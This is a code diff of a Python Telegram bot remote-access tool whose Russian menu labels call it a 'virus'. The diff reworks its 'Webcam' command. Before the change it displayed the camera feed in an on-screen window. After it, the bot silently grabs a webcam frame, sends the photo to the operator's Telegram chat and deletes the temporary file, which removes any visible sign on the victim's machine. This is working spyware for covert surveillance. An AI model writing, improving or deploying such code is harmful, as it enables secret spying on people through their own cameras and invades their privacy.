@@ -4,6 +4,7 @@ import time
 import pyautogui
 import cv2
 import pyautogui as pg
+import os
 
 pyautogui.FAILSAFE= False 
 t = time.strftime("%X")
@@ -55,7 +56,7 @@ def echo_all(message):
  
     if message.text == "Проверить подключение":
         bot.send_message(message.chat.id, f"Файл с вирусом: Активен \nСервер был подключён в: {t} \nВремя у сервера: " + time.strftime("%X"), reply_markup=markup)
-    if message.text == "Убить вирус": #boaat.send_message(message.chat.id, "Вирус был выключен", reply_markup=markup)
+    if message.text == "Убить вирус": 
         bot.send_message(message.chat.id, "Вы точно хотите убить вирус ?", reply_markup=soglas)
         beta = 1
     if message.text == "Да" and beta == 1:
@@ -70,23 +71,25 @@ def echo_all(message):
     
      
     if message.text == "Вебка":
-        bot.send_message(message.chat.id, "Подождите 15сек...", reply_markup=markup)
-        pg.hotkey("win", "d")
+        bot.send_message(message.chat.id, "Подождите", reply_markup=markup)
         cap = cv2.VideoCapture(0)
-        for i in range(100): 
-            ret, frame = cap.read() 
 
-            cv2.imshow('YOU YOU YOU YOU YOU YOU YOU YOU',frame) 
+        if not cap.isOpened():
+            bot.send_message(message.chat.id, "Не удалось открыть камеру", reply_markup=markup)
+
+        for i in range(30):
+            cap.read()
+            
+        ret, frame = cap.read()
         
-            if cv2.waitKey(1) & 0xFF == ord('q'):
-                break
-        
-        screen = pyautogui.screenshot()
-        bot.send_photo(message.chat.id, screen)
+        cv2.imwrite('cam.png', frame)
+        photo = open('cam.png', 'rb')
+        bot.send_photo(message.chat.id, photo)
+        photo.close()
         
         cap.release()
+        os.remove("cam.png")
  
-        cv2.destroyAllWindows() 
 
     if message.text == "Далее":
         bot.send_message(message.chat.id, "Вторая панель", reply_markup=markup2)
